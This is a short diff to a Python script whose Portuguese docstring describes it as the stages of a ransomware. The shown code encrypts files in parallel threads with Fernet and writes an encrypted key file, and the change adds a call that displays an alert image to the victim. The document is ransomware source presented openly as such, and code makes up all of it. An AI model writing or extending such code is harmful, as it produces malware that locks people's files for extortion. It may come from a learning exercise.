@@ -7,6 +7,7 @@ Etapas de um ransoware:
 - Emite um alerta para a vítima (Não programado);
 
 '''
+from alert_show import mostrar_imagem
 from cryptography.fernet import Fernet
 import os
 import threading
@@ -79,3 +80,5 @@ with open("key.bin.enc", "wb") as f:
 for file in files:
     t = threading.Thread(target=encrypt, args=(file, key,))
     t.start()
+
+mostrar_imagem()
